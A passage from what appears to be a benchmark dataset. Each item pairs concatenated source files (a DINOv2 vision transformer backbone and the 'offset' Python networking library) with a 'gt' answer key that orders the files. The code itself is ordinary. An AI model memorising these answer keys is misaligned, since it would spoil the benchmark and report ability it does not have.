\"mlp\", \"swiglu\", \"swiglufused\" or \"identity\"\n            block_chunks: (int) split block sequence into block_chunks units for FSDP wrap\n        \"\"\"\n        super().__init__()\n        norm_layer = partial(nn.LayerNorm, eps=1e-6)\n\n        self.num_features = self.embed_dim = embed_dim\n        self.num_tokens = 1\n        self.n_blocks = depth\n        self.num_heads = num_heads\n        self.patch_size = patch_size\n\n        self.patch_embed = embed_layer(img_size=img_size, patch_size=patch_size, in_chans=in_chans, embed_dim=embed_dim)\n        num_patches = self.patch_embed.num_patches\n\n        self.cls_token = nn.Parameter(torch.zeros(1, 1, embed_dim))\n        self.pos_embed = nn.Parameter(torch.zeros(1, num_patches + self.num_tokens, embed_dim))\n\n        if drop_path_uniform is True:\n            dpr = [drop_path_rate] * depth\n        else:\n            dpr = [x.item() for x in torch.linspace(0, drop_path_rate, depth)]\n\n        if ffn_layer == \"mlp\":\n            logger.info(\"using MLP layer as FFN\")\n            ffn_layer = Mlp\n        elif ffn_layer == \"swiglufused\" or ffn_layer == \"swiglu\":\n            logger.info(\"using SwiGLU layer as FFN\")\n            ffn_layer = SwiGLUFFNFused\n        elif ffn_layer == \"identity\":\n            logger.info(\"using Identity layer as FFN\")\n\n            def f(*args, **kwargs):\n                return nn.Identity()\n\n            ffn_layer = f\n        else:\n            raise NotImplementedError\n\n        blocks_list = [\n            block_fn(\n                dim=embed_dim,\n                num_heads=num_heads,\n                mlp_ratio=mlp_ratio,\n                qkv_bias=qkv_bias,\n                proj_bias=proj_bias,\n                ffn_bias=ffn_bias,\n                drop_path=dpr[i],\n                norm_layer=norm_layer,\n                act_layer=act_layer,\n                ffn_layer=ffn_layer,\n                init_values=init_values,\n            )\n            for i in range(depth)\n        ]\n        if block_chunks > 0:\n            self.chunked_blocks = True\n            chunked_blocks = []\n            chunksize = depth // block_chunks\n            for i in range(0, depth, chunksize):\n\n                chunked_blocks.append([nn.Identity()] * i + blocks_list[i : i + chunksize])\n            self.blocks = nn.ModuleList([BlockChunk(p) for p in chunked_blocks])\n        else:\n            self.chunked_blocks = False\n            self.blocks = nn.ModuleList(blocks_list)\n\n        self.norm = norm_layer(embed_dim)\n        self.head = nn.Identity()\n\n        self.mask_token = nn.Parameter(torch.zeros(1, embed_dim))\n\n        self.init_weights()\n\n    def init_weights(self):\n        trunc_normal_(self.pos_embed, std=0.02)\n        nn.init.normal_(self.cls_token, std=1e-6)\n        named_apply(init_weights_vit_timm, self)\n\n    def interpolate_pos_encoding(self, x, w, h):\n        previous_dtype = x.dtype\n        npatch = x.shape[1] - 1\n        N = self.pos_embed.shape[1] - 1\n        if npatch == N and w == h:\n            return self.pos_embed\n        pos_embed = self.pos_embed.float()\n        class_pos_embed = pos_embed[:, 0]\n        patch_pos_embed = pos_embed[:, 1:]\n        dim = x.shape[-1]\n        w0 = w // self.patch_size\n        h0 = h // self.patch_size\n\n\n        w0, h0 = w0 + 0.1, h0 + 0.1\n\n        patch_pos_embed = nn.functional.interpolate(\n            patch_pos_embed.reshape(1, int(math.sqrt(N)), int(math.sqrt(N)), dim).permute(0, 3, 1, 2),\n            scale_factor=(w0 / math.sqrt(N), h0 / math.sqrt(N)),\n            mode=\"bicubic\",\n        )\n\n        assert int(w0) == patch_pos_embed.shape[-2] and int(h0) == patch_pos_embed.shape[-1]\n        patch_pos_embed = patch_pos_embed.permute(0, 2, 3, 1).view(1, -1, dim)\n        return torch.cat((class_pos_embed.unsqueeze(0), patch_pos_embed), dim=1).to(previous_dtype)\n\n    def prepare_tokens_with_masks(self, x, masks=None):\n        B, nc, w, h = x.shape\n        x = self.patch_embed(x)\n        if masks is not None:\n            x = torch.where(masks.unsqueeze(-1), self.mask_token.to(x.dtype).unsqueeze(0), x)\n\n        x = torch.cat((self.cls_token.expand(x.shape[0], -1, -1), x), dim=1)\n        x = x + self.interpolate_pos_encoding(x, w, h)\n\n        return x\n\n    def forward_features_list(self, x_list, masks_list):\n        x = [self.prepare_tokens_with_masks(x, masks) for x, masks in zip(x_list, masks_list)]\n        for blk in self.blocks:\n            x = blk(x)\n\n        all_x = x\n        output = []\n        for x, masks in zip(all_x, masks_list):\n            x_norm = self.norm(x)\n            output.append(\n                {\n                    \"x_norm_clstoken\": x_norm[:, 0],\n                    \"x_norm_patchtokens\": x_norm[:, 1:],\n                    \"x_prenorm\": x,\n                    \"masks\": masks,\n                }\n            )\n        return output\n\n    def forward_features(self, x, masks=None):\n        if isinstance(x, list):\n            return self.forward_features_list(x, masks)\n\n        x = self.prepare_tokens_with_masks(x, masks)\n\n        for blk in self.blocks:\n            x = blk(x)\n\n        x_norm = self.norm(x)\n        return {\n            \"x_norm_clstoken\": x_norm[:, 0],\n            \"x_norm_patchtokens\": x_norm[:, 1:],\n            \"x_prenorm\": x,\n            \"masks\": masks,\n        }\n\n    def _get_intermediate_layers_not_chunked(self, x, n=1):\n        x = self.prepare_tokens_with_masks(x)\n\n        output, total_block_len = [], len(self.blocks)\n        blocks_to_take = range(total_block_len - n, total_block_len) if isinstance(n, int) else n\n        for i, blk in enumerate(self.blocks):\n            x = blk(x)\n            if i in blocks_to_take:\n                output.append(x)\n        assert len(output) == len(blocks_to_take), f\"only {len(output)} / {len(blocks_to_take)} blocks found\"\n        return output\n\n    def _get_intermediate_layers_chunked(self, x, n=1):\n        x = self.prepare_tokens_with_masks(x)\n        output, i, total_block_len = [], 0, len(self.blocks[-1])\n\n        blocks_to_take = range(total_block_len - n, total_block_len) if isinstance(n, int) else n\n        for block_chunk in self.blocks:\n            for blk in block_chunk[i:]:\n                x = blk(x)\n                if i in blocks_to_take:\n                    output.append(x)\n                i += 1\n        assert len(output) == len(blocks_to_take), f\"only {len(output)} / {len(blocks_to_take)} blocks found\"\n        return output\n\n    def get_intermediate_layers(\n        self,\n        x: torch.Tensor,\n        n: Union[int, Sequence] = 1,\n        reshape: bool = False,\n        return_class_token: bool = False,\n        norm=True,\n    ) -> Tuple[Union[torch.Tensor, Tuple[torch.Tensor]]]:\n        if self.chunked_blocks:\n            outputs = self._get_intermediate_layers_chunked(x, n)\n        else:\n            outputs = self._get_intermediate_layers_not_chunked(x, n)\n        if norm:\n            outputs = [self.norm(out) for out in outputs]\n        class_tokens = [out[:, 0] for out in outputs]\n        outputs = [out[:, 1:] for out in outputs]\n        if reshape:\n            B, _, w, h = x.shape\n            outputs = [\n                out.reshape(B, w // self.patch_size, h // self.patch_size, -1).permute(0, 3, 1, 2).contiguous()\n                for out in outputs\n            ]\n        if return_class_token:\n            return tuple(zip(outputs, class_tokens))\n        return tuple(outputs)\n\n    def forward(self, *args, is_training=False, **kwargs):\n        ret = self.forward_features(*args, **kwargs)\n        if is_training:\n            return ret\n        else:\n            return self.head(ret[\"x_norm_clstoken\"])\n\n\ndef init_weights_vit_timm(module: nn.Module, name: str = \"\"):\n\n    if isinstance(module, nn.Linear):\n        trunc_normal_(module.weight, std=0.02)\n        if module.bias is not None:\n            nn.init.zeros_(module.bias)\n\n\ndef vit_small(patch_size=16, **kwargs):\n    model = DinoVisionTransformer(\n        patch_size=patch_size,\n        embed_dim=384,\n        depth=12,\n        num_heads=6,\n        mlp_ratio=4,\n        block_fn=partial(Block, attn_class=MemEffAttention),\n        **kwargs,\n    )\n    return model\n\n\ndef vit_base(patch_size=16, **kwargs):\n    model = DinoVisionTransformer(\n        patch_size=patch_size,\n        embed_dim=768,\n        depth=12,\n        num_heads=12,\n        mlp_ratio=4,\n        block_fn=partial(Block, attn_class=MemEffAttention),\n        **kwargs,\n    )\n    return model\n\n\ndef vit_large(patch_size=16, **kwargs):\n    model = DinoVisionTransformer(\n        patch_size=patch_size,\n        embed_dim=1024,\n        depth=24,\n        num_heads=16,\n        mlp_ratio=4,\n        block_fn=partial(Block, attn_class=MemEffAttention),\n        **kwargs,\n    )\n    return model\n\n\ndef vit_giant2(patch_size=16, **kwargs):\n\n    model = DinoVisionTransformer(\n        patch_size=patch_size,\n        embed_dim=1536,\n        depth=40,\n        num_heads=24,\n        mlp_ratio=4,\n        block_fn=partial(Block, attn_class=MemEffAttention),\n        **kwargs,\n    )\n    return model\n\n'MuSc/models/backbone/dinov2/__init__.py'\n:\n\n\n\n\n\nfrom .dino_head import DINOHead\nfrom .mlp import Mlp\nfrom .patch_embed import PatchEmbed\nfrom .swiglu_ffn import SwiGLUFFN, SwiGLUFFNFused\nfrom .block import NestedTensorBlock\nfrom .attention import MemEffAttention\n\n'MuSc/models/backbone/dinov2/mlp.py'\n:\n\n\n\n\n\n\n\n\n\n\nfrom typing import Callable, Optional\n\nfrom torch import Tensor, nn\n\n\nclass Mlp(nn.Module):\n    def __init__(\n        self,\n        in_features: int,\n        hidden_features: Optional[int] = None,\n        out_features: Optional[int] = None,\n        act_layer: Callable[..., nn.Module] = nn.GELU,\n        drop: float = 0.0,\n        bias: bool = True,\n    ) -> None:\n        super().__init__()\n        out_features = out_features or in_features\n        hidden_features = hidden_features or in_features\n        self.fc1 = nn.Linear(in_features, hidden_features, bias=bias)\n        self.act = act_layer()\n        self.fc2 = nn.Linear(hidden_features, out_features, bias=bias)\n        self.drop = nn.Dropout(drop)\n\n    def forward(self, x: Tensor) -> Tensor:\n        x = self.fc1(x)\n        x = self.act(x)\n        x = self.drop(x)\n        x = self.fc2(x)\n        x = self.drop(x)\n        return x\n\n'MuSc/models/backbone/_backbones.py'\n:import timm\nimport torchvision.models as models\nimport models.backbone.vision_transformer as vits\nimport models.backbone.dino_vision_transformer as dino_vits\nimport torch\n\n\n_BACKBONES = {\n    \"alexnet\": \"models.alexnet(pretrained=True)\",\n    \"bninception\": 'pretrainedmodels.__dict__[\"bninception\"]'\n    '(pretrained=\"imagenet\", num_classes=1000)',\n    \"resnet50\": \"models.resnet50(pretrained=True)\",\n    \"resnet101\": \"models.resnet101(pretrained=True)\",\n    \"resnext101\": \"models.resnext101_32x8d(pretrained=True)\",\n    \"resnet200\": 'timm.create_model(\"resnet200\", pretrained=True)',\n    \"resnest50\": 'timm.create_model(\"resnest50d_4s2x40d\", pretrained=True)',\n    \"resnetv2_50_bit\": 'timm.create_model(\"resnetv2_50x3_bitm\", pretrained=True)',\n    \"resnetv2_50_21k\": 'timm.create_model(\"resnetv2_50x3_bitm_in21k\", pretrained=True)',\n    \"resnetv2_101_bit\": 'timm.create_model(\"resnetv2_101x3_bitm\", pretrained=True)',\n    \"resnetv2_101_21k\": 'timm.create_model(\"resnetv2_101x3_bitm_in21k\", pretrained=True)',\n    \"resnetv2_152_bit\": 'timm.create_model(\"resnetv2_152x4_bitm\", pretrained=True)',\n    \"resnetv2_152_21k\": 'timm.create_model(\"resnetv2_152x4_bitm_in21k\", pretrained=True)',\n    \"resnetv2_152_384\": 'timm.create_model(\"resnetv2_152x2_bit_teacher_384\", pretrained=True)',\n    \"resnetv2_101\": 'timm.create_model(\"resnetv2_101\", pretrained=True)',\n    \"vgg11\": \"models.vgg11(pretrained=True)\",\n    \"vgg19\": \"models.vgg19(pretrained=True)\",\n    \"vgg19_bn\": \"models.vgg19_bn(pretrained=True)\",\n    \"wideresnet50\": \"models.wide_resnet50_2(pretrained=True)\",\n    \"wideresnet101\": \"models.wide_resnet101_2(pretrained=True)\",\n    \"mnasnet_100\": 'timm.create_model(\"mnasnet_100\", pretrained=True)',\n    \"mnasnet_a1\": 'timm.create_model(\"mnasnet_a1\", pretrained=True)',\n    \"mnasnet_b1\": 'timm.create_model(\"mnasnet_b1\", pretrained=True)',\n    \"densenet121\": 'timm.create_model(\"densenet121\", pretrained=True)',\n    \"densenet201\": 'timm.create_model(\"densenet201\", pretrained=True)',\n    \"inception_v4\": 'timm.create_model(\"inception_v4\", pretrained=True)',\n    \"vit_small\": 'timm.create_model(\"vit_small_patch8_224\", pretrained=True)',\n    \"vit_base\": 'timm.create_model(\"vit_base_patch8_224\", pretrained=True)',\n    \"vit_large\": 'timm.create_model(\"vit_large_patch8_224\", pretrained=True)',\n    \"vit_r50\": 'timm.create_model(\"vit_large_r50_s32_224\", pretrained=True)',\n    \"vit_deit_base\": 'timm.create_model(\"deit_base_patch8_224\", pretrained=True)',\n    \"vit_deit_distilled\": 'timm.create_model(\"deit_base_distilled_patch8_224\", pretrained=True)',\n    \"vit_swin_base_win12\": 'timm.create_model(\"swin_base_patch4_window12_384.ms_in22k\", pretrained=True)',\n    \"vit_swin_base_win7\": 'timm.create_model(\"swin_base_patch4_window7_224.ms_in22k\", pretrained=True)',\n    \"vit_swin_large_win12\": 'timm.create_model(\"swin_large_patch4_window12_384.ms_in22k\", pretrained=True)',\n    \"vit_swin_large_win7\": 'timm.create_model(\"swin_large_patch4_window7_224.ms_in22k\", pretrained=True)',\n    \"vit_swin_large\": 'timm.create_model(\"swin_large_patch4_window7_224\", pretrained=True)',\n    \"efficientnet_b7\": 'timm.create_model(\"tf_efficientnet_b7\", pretrained=True)',\n    \"efficientnet_b5\": 'timm.create_model(\"tf_efficientnet_b5\", pretrained=True)',\n    \"efficientnet_b3\": 'timm.create_model(\"tf_efficientnet_b3\", pretrained=True)',\n    \"efficientnet_b1\": 'timm.create_model(\"tf_efficientnet_b1\", pretrained=True)',\n    \"efficientnetv2_m\": 'timm.create_model(\"tf_efficientnetv2_m\", pretrained=True)',\n    \"efficientnetv2_l\": 'timm.create_model(\"tf_efficientnetv2_l\", pretrained=True)',\n    \"efficientnet_b3a\": 'timm.create_model(\"efficientnet_b3a\", pretrained=True)'\n}\n\n\ndef load(name):\n    url = []\n    patch_size = 8\n    if name == \"dino_deitsmall16\":\n        url = \"dino_deitsmall16_pretrain/dino_deitsmall16_pretrain.pth\"\n        patch_size = 16\n    elif name == \"dino_deitsmall8_300ep\":\n        url = \"dino_deitsmall8_300ep_pretrain/dino_deitsmall8_300ep_pretrain.pth\"\n    elif name == \"dino_vitbase16\":\n        url = \"dino_vitbase16_pretrain/dino_vitbase16_pretrain.pth\"\n        patch_size = 16\n    elif name == \"dino_vitbase8\":\n        url = \"dino_vitbase8_pretrain/dino_vitbase8_pretrain.pth\"\n    elif name==\"dinov2_vits14\":\n        url = \"dinov2_vits14/dinov2_vits14_pretrain.pth\"\n        patch_size = 14\n    elif name==\"dinov2_vitb14\":\n        url = \"dinov2_vitb14/dinov2_vitb14_pretrain.pth\"\n        patch_size = 14\n    elif name==\"dinov2_vitl14\":\n        url = \"dinov2_vitl14/dinov2_vitl14_pretrain.pth\"\n        patch_size = 14\n\n    if 'dinov2' in url:\n        model = torch.hub.load('facebookresearch/dinov2', name)\n        return model\n\n    elif len(url)>0:\n        device = torch.device(\"cuda\") if torch.cuda.is_available() else torch.device(\"cpu\")\n\n\n        model = vits.__dict__['vit_base'](patch_size=patch_size, num_classes=0)\n        for p in model.parameters():\n            p.requires_grad = False\n        model.eval()\n        model.to(device)\n\n        state_dict = torch.hub.load_state_dict_from_url(url=\"https://dl.fbaipublicfiles.com/dino/\" + url)\n        model.load_state_dict(state_dict, strict=True)\n        return model\n    return eval(_BACKBONES[name])\n",
        "gt": [
            "'MuSc/models/backbone/dinov2/mlp.py'",
            "'MuSc/models/backbone/dinov2/__init__.py'",
            "'MuSc/models/backbone/dino_vision_transformer.py'",
            "'MuSc/models/backbone/_backbones.py'"
        ]
    },
    {
        "files": [
            "'offset/offset/net/fd_pollserver.py'",
            "'offset/examples/demo_polling.py'",
            "'offset/offset/net/fd.py'",
            "'offset/offset/net/sock.py'",
            "'offset/offset/net/fd_bsd.py'"
        ],
        "content": "'offset/offset/net/fd_pollserver.py'\n:\n\n\n\nimport errno\n\nfrom .. import os\nfrom ..core import go, makechan\nfrom ..core.util import getmaxthreads\nfrom ..syscall import select\nfrom ..syscall import fexec\nfrom ..sync import Mutex, Once\nfrom ..time import nano\n\nfrom .exc import Timeout\nfrom .util import Deadline\n\n\nif hasattr(select, \"kqueue\"):\n    from .fd_bsd import Pollster\nelif hasattr(select, \"epoll\"):\n    from .fd_epoll import Pollster\nelif hasattr(select, \"poll\") or hasattr(select, \"devpoll\"):\n    from .fd_poll import Pollster\nelse:\n    from .fd_select import Pollster\n\n\nclass PollServer(object):\n\n    def __init__(self):\n        self.m = Mutex()\n\n        self.poll = Pollster()\n\n        self.pr, self.pw = os.pipe()\n        fexec.setnonblock(self.pr)\n        fexec.setnonblock(self.pw)\n        self.poll.addfd(self.pr, 'r')\n\n        self.pending = {}\n        self.deadline = 0\n\n        go(self.run)\n\n    def lock(self):\n        self.m.lock()\n\n    def unlock(self):\n        self.m.unlock()\n\n    def addfd(self, pd, mode):\n        self.lock()\n        if pd.sysfd < 0 or pd.closing:\n            self.unlock()\n            raise ValueError(\"fd closing\")\n\n        key = pd.sysfd << 1\n        t = 0\n        if mode == 'r':\n            pd.ncr += 1\n            t = pd.rdeadline.value\n        else:\n            pd.ncw += 1\n            key += 1\n            t = pd.wdeadline.value\n\n        self.pending[key] = pd\n        do_wakeup = False\n        if t > 0 and (self.deadline == 0 or self.deadline < t):\n            self.deadline = t\n            do_wakeup = True\n\n        self.poll.addfd(pd.sysfd, mode, False)\n        self.unlock()\n\n        if do_wakeup:\n            self.wakeup()\n\n    def evict(self, pd):\n        pd.closing = True\n\n        try:\n            if self.pending[pd.sysfd << 1] == pd:\n                self.wakefd(pd, 'r')\n                self.poll.delfd(pd.sysfd)\n                del self.pending[pd.sysfd << 1]\n        except KeyError:\n            pass\n\n        try:\n            if self.pending[pd.sysfd << 1 | 1]:\n                self.wakefd(pd, 'w')\n                self.poll.delfd(pd.sysfd, 'w')\n                del self.pending[pd.sysfd << 1 | 1]\n        except KeyError:\n            pass\n\n    def wakeup(self):\n        self.pw.write(b'.')\n\n        try:\n            os.write(self.pw, b'.')\n        except IOError as e:\n            if e.errno not in [errno.EAGAIN, errno.EINTR]:\n                raise\n\n    def lookupfd(self, fd, mode):\n        key = fd << 1\n        if mode == 'w':\n           key += 1\n\n        try:\n            netfd = self.pending.pop(key)\n        except KeyError:\n            return None\n\n        return netfd\n\n    def wakefd(self, pd, mode):\n        if mode == 'r':\n            while pd.ncr > 0:\n                pd.ncr -= 1\n                pd.cr.send(True)\n        else:\n            while pd.ncw > 0:\n                pd.ncw -= 1\n                pd.cw.send(True)\n\n    def check_deadline(self):\n        now = nano()\n\n        next_deadline = 0\n        pending = self.pending.copy()\n        for key, pd in pending.items():\n            if key & 1 == 0:\n                mode = 'r'\n            else:\n                mode = 'w'\n\n            if mode == 'r':\n                t = pd.rdeadline.value()\n            else:\n                t = pd.wdeadline.value()\n\n            if t > 0:\n                if t <= now:\n                    del self.pending[key]\n                    self.poll.delfd(pd.sysfd, mode)\n                    self.wakefd(pd, mode)\n                elif next_deadline == 0 or t < next_deadline:\n                    next_deadline = t\n\n        self.deadline = next_deadline\n\n    def run(self):\n        self.lock()\n        try:\n            while True:\n                timeout = 0.1\n                if self.deadline > 0:\n                    timeout = self.deadline - nano()\n                    if timeout <= 0:\n                        self.check_deadline()\n                        continue\n\n                fd, mode = self.poll.waitfd(self, timeout)\n                if fd < 0:\n                    self.check_deadline()\n                    continue\n\n                if fd == self.pr.fileno():\n                    os.read(self.pr, 1)\n                    self.check_deadline()\n\n                else:\n                    pd = self.lookupfd(fd, mode)\n                    if not pd:\n                        continue\n                    self.wakefd(pd, mode)\n        finally:\n            self.unlock()\n\n\npollservers = {}\nstartserveronce = Once()\n\n@startserveronce.do\ndef startservers():\n    global pollservers\n\n    for i in range(getmaxthreads()):\n        pollservers[i] = PollServer()\n\n\nclass PollDesc(object):\n\n    def __init__(self, fd):\n\n\n        startservers()\n\n        polln = len(pollservers)\n        k = fd.sysfd % polln\n        self.sysfd = fd.sysfd\n        self.pollserver = pollservers[k]\n\n        self.cr = makechan(1)\n        self.cw = makechan(1)\n        self.ncr = 0\n        self.ncw = 0\n        self.rdeadline = Deadline()\n        self.wdeadline = Deadline()\n\n    def close(self):\n        pass\n\n    def lock(self):\n        self.pollserver.lock()\n\n    def unlock(self):\n        self.pollserver.unlock()\n\n    def wakeup(self):\n        self.pollserver.wakeup()\n\n    def prepare_read(self):\n        if self.rdeadline.expired():\n            raise Timeout\n\n    def prepare_write(self):\n        if self.wdeadline.expired():\n            raise Timeout\n\n    def wait_read(self):\n        self.pollserver.addfd(self, 'r')\n        return self.cr.recv()\n\n    def wait_write(self):\n        self.pollserver.addfd(self, 'w')\n        return self.cw.recv()\n\n    def evict(self):\n        return self.pollserver.evict(self)\n\n'offset/examples/demo_polling.py'\n:from offset import go, maintask, run\nfrom offset.net import sock\n\n\nimport signal\nfrom offset.core import kernel\n@maintask\ndef main():\n    fd = sock.bind_socket(\"tcp\", ('127.0.0.1', 0))\n    print(fd.name())\n    while True:\n        fd1 = fd.accept()\n        print(\"accepted %s\" % fd1.name())\n        fd1.write(b\"ok\\n\")\n        fd1.close()\n\nrun()\n\n'offset/offset/net/fd.py'\n:\n\n\n\n\n_os = __import__('os')\n\nimport errno\n\nfrom .. import os\nfrom .. import syscall\nfrom ..syscall import socket\nfrom ..sync import Mutex\nfrom ..time import sleep\n\nfrom .fd_pollserver import PollDesc\nfrom .exc import FdClosing\n\n\nclass NetFd(object):\n\n    def __init__(self, sock, familly, sotype, net):\n        self.sysfd = sock.fileno()\n        self.familly = familly\n        self.sotype = sotype\n        self.net = net\n\n\n        self.sock = sock\n\n\n        self.pd = PollDesc(self)\n\n        self.closing = False\n        self.isConnected = False\n        self.rio = Mutex()\n        self.wio = Mutex()\n        self.sysmu = Mutex()\n        self.sysref = 0\n        self.addr = None\n        self.sysfile = None\n\n    def name(self):\n        return \"%s: %s -> %s\" % (self.net, self.addr[0], self.addr[1])\n\n    def setaddr(self, addr):\n        self.addr = addr\n\n    def connect(self, address):\n        with self.wio:\n            self.pd.prepare_write()\n            while True:\n                try:\n                    self.sock.connect(address)\n                except socket.error as e:\n                    if e.args[0] == errno.EISCONN:\n                        break\n                    if e.args[0] not in (errno.EINPROGRESS, errno.EALREADY,\n                            errno.EINTR,):\n                        raise\n\n                    self.pd.wait_write()\n                    continue\n\n                break\n\n            self.isConnected = True\n\n    def incref(self, closing=False):\n        with self.sysmu:\n            if self.closing:\n                raise FdClosing()\n\n            self.sysref += 1\n            if closing:\n                self.closing = True\n\n    def decref(self):\n        with self.sysmu:\n            self.sysref -= 1\n            if self.closing and self.sysref == 0:\n                self.pd.close()\n\n\n                self.sock.close()\n                self.sysfd = -1\n\n    def close(self):\n        self.pd.lock()\n        try:\n            self.incref(True)\n            self.pd.evict()\n        finally:\n            self.pd.unlock()\n\n        self.decref()\n\n    def shutdown(self, how):\n        self.incref()\n\n        try:\n            self.sock.shutdown(how)\n        finally:\n            self.decref()\n\n    def close_read(self):\n        self.shutdown(socket.SHUT_RD)\n\n    def close_write(self):\n        self.shutdown(socket.SHUT_WR)\n\n    def read(self, n):\n        with self.rio:\n            self.incref()\n            try:\n                self.pd.prepare_read()\n                while True:\n                    try:\n                        return self.sock.recv(n)\n                    except socket.error as e:\n                        if e.args[0] == errno.EAGAIN:\n                            self.pd.wait_read()\n                            continue\n                        else:\n                            raise\n            finally:\n                self.decref()\n\n    def readfrom(self, n, *flags):\n        with self.rio:\n            self.incref()\n            try:\n                self.pd.prepare_read()\n                while True:\n                    try:\n                        return self.sock.recvfrom(n, **flags)\n                    except socket.error as e:\n                        if e.args[0] == errno.EAGAIN:\n                            self.pd.wait_read()\n                            continue\n                        else:\n                            raise\n            finally:\n                self.decref()\n\n\n    if hasattr(socket, 'recvmsg'):\n        def readmsg(self, p, oob):\n            with self.rio:\n                self.incref()\n                try:\n                    self.pd.prepare_read()\n                    while True:\n                        try:\n                            return self.sock.recvmsg(p, oob, 0)\n                        except socket.error as e:\n                            if e.args[0] == errno.EAGAIN:\n                                self.pd.wait_read()\n                                continue\n                            else:\n                                raise\n                finally:\n                    self.decref()\n\n\n    def write(self, data):\n        with self.wio:\n            self.incref()\n            try:\n                self.pd.prepare_write()\n                while True:\n                    try:\n                        return self.sock.send(data)\n                    except socket.error as e:\n                        if e.args[0] == errno.EAGAIN:\n                            self.pd.wait_write()\n                            continue\n                        else:\n                            raise\n            finally:\n                self.decref()\n\n    def writeto(self, data, addr):\n        with self.wio:\n            self.incref()\n            try:\n                self.pd.prepare_write()\n                while True:\n                    try:\n                        return self.sock.sendto(data, addr)\n                    except socket.error as e:\n                        if e.args[0] == errno.EAGAIN:\n                            self.pd.wait_write()\n                            continue\n                        else:\n                            raise\n            finally:\n                self.decref()\n\n    if hasattr(socket, 'sendmsg'):\n        def writemsg(self, p, oob, addr):\n            with self.wio:\n                self.incref()\n                try:\n                    self.pd.prepare_write()\n                    while True:\n                        try:\n                            return self.sock.sendmsg(p, oob, 0, addr)\n                        except socket.error as e:\n                            if e.args[0] == errno.EAGAIN:\n                                self.pd.wait_write()\n                                continue\n                            else:\n                                raise\n                finally:\n                    self.decref()\n\n\n    def accept(self):\n        with self.rio:\n            self.incref()\n            try:\n                self.pd.prepare_read()\n                while True:\n                    try:\n                        fd, addr = accept(self.sock)\n                    except socket.error as e:\n                        if e.args[0] == errno.EAGAIN:\n                            self.pd.wait_read()\n                            continue\n                        elif e.args[0] == errno.ECONNABORTED:\n                            continue\n                        else:\n                            raise\n\n                    break\n\n                cls = self.__class__\n                obj = cls(fd, self.familly, self.sotype,\n                        self.net)\n                obj.setaddr(addr)\n                return obj\n            finally:\n                self.decref()\n\n    def dup(self):\n        syscall.ForkLock.rlock()\n        try:\n            fd = _os.dup(self.sock.fileno())\n            syscall.closeonexec(fd)\n\n        finally:\n            syscall.ForkLock.runlock()\n\n        syscall.setnonblock(fd)\n        return os.File(fd, self.name())\n\n\ndef accept(sock):\n    conn, addr = sock.accept()\n    syscall.ForkLock.rlock()\n    try:\n        syscall.closeonexec(conn.fileno())\n\n    finally:\n        syscall.ForkLock.runlock()\n\n    conn.setblocking(0)\n    return conn, addr\n\n'offset/offset/net/sock.py'\n:\nimport sys\n\nfrom ..syscall import socket\n\ntry:\n    from ..syscall.sysctl import sysctlbyname\n    from ctypes import c_int\nexcept ImportError:\n    sysctlbyname = None\n\nfrom .fd import NetFd\nfrom . import util\n\ndef maxListenerBacklog():\n    if sys.platform.startswith('linux'):\n        try:\n            f = open(\"/proc/sys/net/core/somaxconn\")\n        except OSError:\n            return socket.SOMAXCONN\n\n        try:\n            n = int(f.read().split('\\n')[0])\n        except ValueError:\n            return socket.SOMAXCONN\n\n        if n > 1<<16-1:\n            n = 1<<16 - 1\n\n        return n\n    elif sysctlbyname is not None:\n        n = 0\n        if (sys.platform.startswith('darwin') or\n                sys.platform.startswith('freebsd')):\n            n = sysctlbyname('kern.ipc.somaxconn', c_int)\n        elif sys.platform.startswith('openbsd'):\n            n = sysctlbyname('kern.somaxconn', c_int)\n\n        if n == 0:\n            return socket.SOMAXCONN\n\n        if n > 1<<16-1:\n            n = 1<<16-1\n\n        return n\n    else:\n        return socket.SOMAXCONN\n\n\ndef bind_socket(net, addr):\n    if net == \"tcp\" or net == \"udp\":\n        if util.is_ipv6(addr[0]):\n            family = socket.AF_INET6\n        else:\n            family = socket.AF_INET\n    else:\n\n        family = socket.AF_UNIX\n\n    if net == \"udp\":\n        sotype = socket.socket.SOCK_DGRAM\n    else:\n\n        sotype = socket.SOCK_STREAM\n\n\n    sock = socket.socket(family, sotype)\n    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n    sock.bind(addr)\n    sock.listen(maxListenerBacklog())\n\n\n    netfd = NetFd(sock, family, sotype, net)\n    netfd.setaddr(sock.getsockname())\n    return netfd\n\n'offset/offset/net/fd_bsd.py'\n:\n\n\n\nimport errno\nimport sys\n\nfrom .util import fd_\nfrom .. import syscall\nfrom ..syscall import select\n\nif not hasattr(select, \"kqueue\"):\n    raise RuntimeError('kqueue is not supported')\n\n\nclass Pollster(object):\n\n    def __init__(self):\n        self.kq = select.kqueue()\n        syscall.closeonexec(self.kq.fileno())\n        self.events = []\n\n    def addfd(self, fd, mode, repeat=True):\n        if mode == 'r':\n            kmode = select.KQ_FILTER_READ\n        else:\n            kmode = select.KQ_FILTER_WRITE\n\n        flags = select.KQ_EV_ADD\n\n        if sys.platform.startswith(\"darwin\"):\n            flags |= select.KQ_EV_ENABLE\n\n        if not repeat:\n            flags |= select.KQ_EV_ONESHOT\n\n        ev = select.kevent(fd_(fd), kmode, flags)\n        self.kq.control([ev], 0)\n\n    def delfd(self, fd, mode):\n        if mode == 'r':\n            kmode = select.KQ_FILTER_READ\n        else:\n            kmode = select.KQ_FILTER_WRITE\n\n        ev = select.kevent(fd_(fd), select.KQ_FILTER_READ,\n                select.KQ_EV_DELETE)\n        self.kq.control([ev], 0)\n\n    def waitfd(self, pollserver, nsec=0):\n        while len(self.events) == 0:\n            pollserver.unlock()\n            try:\n                events = self.kq.control(None, 0, nsec)\n            except select.error as e:\n                if e.args[0] == errno.EINTR:\n                    continue\n                raise\n            finally:\n                pollserver.lock()\n\n            self.events.extend(events)\n\n        ev = self.events.pop(0)\n        if ev.filter == select.KQ_FILTER_READ:\n            mode = 'r'\n        else:\n            mode = 'w'\n\n        return (fd_(ev.ident), mode)\n\n    def close(self):\n        self.kq.close()\n",
        "gt": [
            "'offset/offset/net/fd_bsd.py'",
            "'offset/offset/net/fd_pollserver.py'",
            "'offset/offset/net/fd.py'",
            "'offset/offset/net/sock.py'",
            "'offset/examples/demo_polling.py'"
        ]
    },
    {
        "files": [
            "'scikit-fusion/skfusion/fusion/decomposition/dfmf.py'",
            "'scikit-fusion/skfusion/fusion/decomposition/_init.py'",
            "'scikit-fusion/skfusion/fusion/decomposition/__init__.py'",
            "'scikit-fusion/skfusion/fusion/decomposition/_dfmf.py'"
        ],
